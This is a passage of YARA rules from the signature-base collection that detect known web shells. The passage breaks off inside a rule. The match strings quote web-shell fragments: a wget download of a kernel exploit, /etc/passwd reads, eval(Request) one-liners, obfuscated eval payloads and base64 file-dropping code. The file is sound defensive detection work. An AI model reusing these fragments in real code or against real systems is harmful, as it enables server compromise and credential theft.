rule SIGNATURE_BASE_Webshell_Backdoor_PHP_Agent_R57_Mod_Bizzz_Shell_R57 : FILE {
    meta:
		description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
		author = "Florian Roth (Nextron Systems)"
		id = "00d3159c-f5d2-5b49-9499-3bb938776858"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9357-L9382"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "51660ea25d1b2290c0ca30377dbf378cac8d7b7650603f1dbe5b7914c530d5cf"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
		hash2 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
		hash3 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
		hash4 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
		hash5 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
		hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
		hash7 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
		hash8 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
		hash9 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
		hash10 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
		hash11 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"

	strings:
		$s1 = "$_POST['cmd'] = which('" ascii
		$s2 = "$blah = ex(" ascii

	condition:
		filesize <600KB and all of them
}
rule SIGNATURE_BASE_Webshell_C100 : FILE {
    meta:
		description = "Detects Webshell - rule generated from from files c100 v. 777shell"
		author = "Florian Roth (Nextron Systems)"
		id = "aa8317ff-680d-5b60-b8a9-a77ea58f0ed0"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9384-L9408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "cc8c59f70f5ec6c89812b1597e9b864e358593ea5782e359cd483dee1a84b28b"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash2 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash3 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash4 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash5 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash6 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"

	strings:
		$s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
		$s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
		$s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
		$s4 = "which wget curl w3m lynx" ascii
		$s6 = "netstat -atup | grep IST" ascii

	condition:
		filesize <685KB and 2 of them
}
rule SIGNATURE_BASE_Webshell_Acidpoison : FILE {
    meta:
		description = "Detects Poison Sh3ll - Webshell"
		author = "Florian Roth (Nextron Systems)"
		id = "6c201221-ca67-57fb-9bc7-fab4fc1da982"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9410-L9433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "31add38bcdc33d5e4b825bfa18ff1a47d5aa5aaeebd8e3adac533c471aa30629"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash4 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash5 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash6 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash7 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
		hash8 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
		hash9 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		hash10 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"

	strings:
		$s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii

	condition:
		filesize <550KB and all of them
}
rule SIGNATURE_BASE_Webshell_Acid_Fatalisticz_Fx_Fx_P0Ison_Sh3Ll_X0Rg_Byp4Ss_256 : FILE {
    meta:
		description = "Detects Webshell"
		author = "Florian Roth (Nextron Systems)"
		id = "80f7d202-adb8-5d9c-b176-576e3b9553c1"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9435-L9454"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "07cd255247c9a77b1c9b6049a2b96632252ea9572880b10991c6797c14a05d48"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash2 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash3 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash4 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		hash5 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"

	strings:
		$s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" fullword ascii
		$s2 = "foreach($quicklaunch2 as $item) {" fullword ascii

	condition:
		filesize <882KB and all of them
}
rule SIGNATURE_BASE_Webshell_Ayyildiz : FILE {
    meta:
		description = "Detects Webshell"
		author = "Florian Roth (Nextron Systems)"
		id = "cc752958-eb6c-5185-b94c-5fcec833924d"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9456-L9475"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "8441b7d730e337e002eeb7ae8f489e405409ddbe62f45bbc9a74c935d1d9fe66"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "0e25aec0a9131e8c7bd7d5004c5c5ffad0e3297f386675bccc07f6ea527dded5"
		hash2 = "9c43aada0d5429f8c47595f79a7cdd5d4eb2ba5c559fb5da5a518a6c8c7c330a"
		hash3 = "2ebf3e5f5dde4a27bbd60e15c464e08245a35d15cc370b4be6b011aa7a46eaca"
		hash4 = "77a63b26f52ba341dd2f5e8bbf5daf05ebbdef6b3f7e81cec44ce97680e820f9"
		hash5 = "61c4fcb6e788c0dffcf0b672ae42b1676f8a9beaa6ec7453fc59ad821a4a8127"

	strings:
		$s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
		$s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii

	condition:
		filesize <112KB and all of them
}
rule SIGNATURE_BASE_Webshell_Zehir : FILE {
    meta:
		description = "Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "7f8f15a6-1c5b-5c75-b61a-df7b18699f5a"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9477-L9496"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "c8fda66ada3581d2471b322ae65032b68c69b882c29f7469dd2ed78800c9c5f7"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218"
		hash2 = "0c5f8a2ed62d10986a2dd39f52886c0900a18c03d6d279207b8de8e2ed14adf6"
		hash3 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
		hash4 = "b57bf397984545f419045391b56dcaf7b0bed8b6ee331b5c46cee35c92ffa13d"
		hash5 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"

	strings:
		$s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
		$s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii

	condition:
		filesize <200KB and 1 of them
}
rule SIGNATURE_BASE_Uploadshell_98038F1Efa4203432349Badabad76D44337319A6 : FILE {
    meta:
		description = "Detects a web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "f385b091-ce0d-5d5b-8eeb-57e00c8d0210"
		date = "2016-09-10"
		modified = "2023-12-05"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9507-L9522"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "68f0de84a387a9af1a32dd8d38c66b002e16e1c954a51e6bc307580180faedbf"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "506a6ab6c49e904b4adc1f969c91e4f1a7dde164be549c6440e766de36c93215"

	strings:
		$s2 = "$lol = file_get_contents(\"../../../../../wp-config.php\");" fullword ascii
		$s6 = "@unlink(\"./export-check-settings.php\");" fullword ascii
		$s7 = "$xos = \"Safe-mode:[Safe-mode:\".$hsafemode.\"] " fullword ascii

	condition:
		( uint16(0)==0x3f3c and filesize <6KB and ( all of ($s*))) or ( all of them )
}
rule SIGNATURE_BASE_Dkshell_F0772Be3C95802A2D1E7A4A3F5A45Dcdef6997F3 : FILE {
    meta:
		description = "Detects a web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "161ceca6-f5e8-5bcf-bc31-2a2169b1a1c7"
		date = "2016-09-10"
		modified = "2023-12-05"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9524-L9538"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "81b0a08d1b9d3640e656a5cd08b79c0a2f940a2db5c2d939d19509f993514e86"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "7ea49d5c29f1242f81f2393b514798ff7caccb50d46c60bdfcf61db00043473b"

	strings:
		$s1 = "<?php Error_Reporting(0); $s_pass = \"" ascii
		$s2 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on" ascii

	condition:
		( uint16(0)==0x3c0a and filesize <300KB and all of them )
}
rule SIGNATURE_BASE_Unknown_8Af033424F9590A15472A23Cc3236E68070B952E : FILE {
    meta:
		description = "Detects a web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "fcf467b6-f49a-52d0-a57f-9f3cf6d0b25b"
		date = "2016-09-10"
		modified = "2023-12-05"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9540-L9555"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "d7dc9a2a5e0800b5061cb2101d7cda023a6e637f1e7b14054fdb6a0b2cec6084"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "3382b5eaaa9ad651ab4793e807032650667f9d64356676a16ae3e9b02740ccf3"

	strings:
		$s1 = "$check = $_SERVER['DOCUMENT_ROOT']" fullword ascii
		$s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
		$s3 = "fwrite($fp,base64_decode('" ascii

	condition:
		( uint16(0)==0x6324 and filesize <6KB and ( all of ($s*))) or ( all of them )
}
rule SIGNATURE_BASE_Dkshell_4000Bd83451F0D8501A9Dfad60Dce39E55Ae167D : FILE {
    meta:
		description = "Detects a web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "804f7229-1440-5a2e-91cd-a58a38b22aa9"
		date = "2016-09-10"
		modified = "2023-12-05"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9557-L9575"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "26d586e32d1b0b7800b4b61f592dadc3dd0583628e4cd3fa4e24e02067077da5"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "51a16b09520a3e063adf10ff5192015729a5de1add8341a43da5326e626315bd"

	strings:
		$x1 = "DK Shell - Took the Best made it Better..!!" fullword ascii
		$x2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
		$x3 = "echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';" fullword ascii
		$s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
		$s9 = "$x = $_GET[\"x\"];" fullword ascii

	condition:
		( uint16(0)==0x3f3c and filesize <200KB and 1 of ($x*)) or (3 of them )
}
rule SIGNATURE_BASE_Webshell_5786D7D9F4B0Df731D79Ed927Fb5A124195Fc901 : FILE {
    meta:
		description = "Detects a web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "7958e5fc-5ac5-58bc-8128-0a778e99a4e4"
		date = "2016-09-10"
		modified = "2023-12-05"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9577-L9591"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "348ccdf997965fbea791d835f1dd4e2c16d37a17ff4195e585fa4226f18faad6"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "b1733cbb0eb3d440c4174cc67ca693ba92308ded5fc1069ed650c3c78b1da4bc"

	strings:
		$s1 = "preg_replace(\"\\x2F\\x2E\\x2A\\x2F\\x65\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x" ascii
		$s2 = "input[type=text], input[type=password]{" fullword ascii

	condition:
		( uint16(0)==0x6c3c and filesize <80KB and all of them )
}
rule SIGNATURE_BASE_Webshell_E8Eaf8Da94012E866E51547Cd63Bb996379690Bf : FILE {
    meta:
		description = "Detects a web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "8fda9b9f-9a72-5123-91d7-0d0aec9e17bc"
		date = "2016-09-10"
		modified = "2023-12-05"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9593-L9608"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "044491f0b07ef606aa76e70a07d161565f9cecf73e8f9f8db63cacc1c475b056"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "027544baa10259939780e97dc908bd43f0fb940510119fc4cce0883f3dd88275"

	strings:
		$x1 = "@exec('./bypass/ln -s /etc/passwd 1.php');" fullword ascii
		$x2 = "echo \"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \";" fullword ascii
		$x3 = "@exec('tar -xvf mysqldumper.tar.gz');" fullword ascii

	condition:
		( uint16(0)==0x213c and filesize <100KB and 1 of ($x*)) or (2 of them )
}
rule SIGNATURE_BASE_Unknown_0F06C5D1B32F4994C3B3Abf8Bb76D5468F105167 : FILE {
    meta:
		description = "Detects a web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "efd09da2-f232-5a21-99c8-dc2bf00baa73"
		date = "2016-09-10"
		modified = "2023-12-05"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9610-L9625"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "6f4bdf8aecd527335c29a8e964c7d8688c3e77419595d3fd10a6cf3704711816"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "6362372850ac7455fa9461ed0483032a1886543f213a431f81a2ac76d383b47e"

	strings:
		$s1 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/libraries/lola.php\" ;" fullword ascii
		$s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
		$s3 = "fwrite($fp,base64_decode('" ascii

	condition:
		( uint16(0)==0x6324 and filesize <2KB and all of them )
}
rule SIGNATURE_BASE_Wsoshell_0Bbebaf46F87718Caba581163D4Beed56Ddf73A7 : FILE {
    meta:
		description = "Detects a web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "92165645-5392-588d-ba2a-5ef6b7499a5a"
		date = "2016-09-10"
		modified = "2023-12-05"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9627-L9641"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "bf5090fb909fea690c8a2af3cca35136eda3b9773976189158c25fb8877cc266"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "d053086907aed21fbb6019bf9e644d2bae61c63563c4c3b948d755db3e78f395"

	strings:
		$s8 = "$default_charset='Wi'.'ndo.'.'ws-12'.'51';" fullword ascii
		$s9 = "$mosimage_session = \"" fullword ascii

	condition:
		( uint16(0)==0x3f3c and filesize <300KB and all of them )
}
rule SIGNATURE_BASE_Webshell_Generic_1609_A : FILE {
    meta:
		description = "Auto-generated rule"
		author = "Florian Roth (Nextron Systems)"
		id = "4b7db4db-8699-5b4d-ab90-ce79f1160984"
		date = "2016-09-10"
		modified = "2023-12-05"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9643-L9658"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e5a4bba3a7b1c712203fcc8b85e4089b0ff18a26e96f5a04529616dbfb9de651"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "c817a490cfd4d6377c15c9ac9bcfa136f4a45ff5b40c74f15216c030f657d035"
		hash3 = "69b9d55ea2eb4a0d9cfe3b21b0c112c31ea197d1cb00493d1dddc78b90c5745e"

	strings:
		$s1 = "return $qwery45234dws($b);" fullword ascii

	condition:
		( uint16(0)==0x3f3c and 1 of them )
}
rule SIGNATURE_BASE_Nishang_Webshell : FILE {
    meta:
		description = "Detects a ASPX web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "785e6da7-097e-598b-9799-ffe43738d718"
		date = "2016-09-11"
		modified = "2023-12-05"
		reference = "https://github.com/samratashok/nishang"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9660-L9675"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b8a3c8e80a4e41e556e2d65df4126d84723ded6ca623302afc4cc328bded346c"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" ascii
		$s2 = "output.Text += \"\nPS> \" + console.Text + \"\n\" + do_ps(console.Text);" ascii
		$s3 = "<title>Antak Webshell</title>" fullword ascii
		$s4 = "<asp:Button ID=\"executesql\" runat=\"server\" Text=\"Execute SQL Query\"" ascii

	condition:
		( uint16(0)==0x253C and filesize <100KB and 1 of ($s*))
}
rule SIGNATURE_BASE_PHP_Webshell_1_Feb17 : FILE {
    meta:
		description = "Detects a simple cloaked PHP web shell"
		author = "Florian Roth (Nextron Systems)"
		id = "eedf87c9-2dab-530d-b5d8-a4c2ebc87821"
		date = "2017-02-28"
		modified = "2023-12-05"
		reference = "https://isc.sans.edu/diary/Analysis+of+a+Simple+PHP+Backdoor/22127"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9687-L9708"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "c8576b20ec3f81b3ef0aa5a508c94e07d591d68767cb4598ad10778b4305915d"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$h1 = "<?php ${\"\\x" ascii
		$x1 = "\";global$auth;function sh_decrypt_phase($data,$key){${\"" ascii
		$x2 = "global$auth;return sh_decrypt_phase(sh_decrypt_phase($" ascii
		$x3 = "]}[\"\x64\"]);}}echo " ascii
		$x4 = "\"=>@phpversion(),\"\\x" ascii
		$s1 = "$i=Array(\"pv\"=>@phpversion(),\"sv\"" ascii
		$s3 = "$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));" ascii

	condition:
		uint32(0)==0x68703f3c and ($h1 at 0 and 1 of them ) or 2 of them
}
rule SIGNATURE_BASE_Webshell_Tiny_JSP_2 : FILE {
    meta:
		description = "Detects a tiny webshell - chine chopper"
		author = "Florian Roth (Nextron Systems)"
		id = "b628c4f9-eb07-592d-834a-5c94e41987da"
		date = "2015-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9710-L9722"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "6fd514df9d53293a8cfd4b9c807f993558e39979592aa221f18cd76079c00fb7"
		score = 100
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<%eval(Request(" nocase

	condition:
		uint16(0)==0x253c and filesize <40 and all of them
}
rule SIGNATURE_BASE_Wordpress_Config_Webshell_Preprend : FILE {
    meta:
		description = "Webshell that uses standard Wordpress wp-config.php file and appends the malicious code in front of it"
		author = "Florian Roth (Nextron Systems)"
		id = "2a432c53-5dee-5a2e-9ccf-9e5d52713af9"
		date = "2017-06-25"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9734-L9756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "97d7b85fa191380fe8b26ea60c8735a8f7179acc3a496ff0fc0dc5eefde2fe8a"
		score = 65
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x1 = " * @package WordPress" fullword ascii
		$s1 = "define('DB_NAME'," ascii
		$s2 = "require_once(ABSPATH . 'wp-settings.php');" ascii
		$fp1 = "iThemes Security Config" ascii

	condition:
		uint32(0)==0x68703f3c and filesize <400KB and $x1 and all of ($s*) and not $x1 in (0..1000) and not 1 of ($fp*)
}
rule SIGNATURE_BASE_PAS_Webshell_Encoded : FILE {
    meta:
		description = "Detects a PAS webshell"
		author = "Florian Roth (Nextron Systems)"
		id = "6cb547ad-7a97-5c3d-83e1-114ea798ddb8"
		date = "2017-07-11"
		modified = "2023-12-05"
		reference = "http://blog.talosintelligence.com/2017/07/the-medoc-connection.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9767-L9802"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "59f4f8caa60c2367b46f6af1aefa62e03e228b382ff58be3a27dad527a685eca"
		score = 80
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$head1 = "<?php $____=" fullword ascii
		$head2 = "'base'.(32*2).'"
		$enc1 = "isset($_COOKIE['___']" ascii
		$enc2 = "if($___!==NULL){" ascii
		$enc3 = ").substr(md5(strrev($" ascii
		$enc4 = "]))%256);$" ascii
		$enc5 = "]))@setcookie('" ascii
		$enc6 = "]=chr(( ord($_" ascii
		$x1 = { 3D 0A 27 29 29 3B 69 66 28 69 73 73 65 74 28 24 5F 43 4F 4F 4B 49 45 5B 27 }
		$foot1 = "value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>"
		$foot2 = "();}} @header(\"Status: 404 Not Found\"); ?>"

	condition:
		( uint32(0)==0x68703f3c and filesize <80KB and (3 of them or $head1 at 0 or $head2 in (0..20) or 1 of ($x*))) or $foot1 at ( filesize -52) or $foot2 at ( filesize -44)
}
rule SIGNATURE_BASE_ALFA_SHELL : FILE {
    meta:
		description = "Detects web shell often used by Iranian APT groups"
		author = "Florian Roth (Nextron Systems)"
		id = "f0be44ec-bff0-5d01-aabd-df7aa05383e3"
		date = "2017-09-21"
		modified = "2023-12-05"
		reference = "Internal Research - APT33"
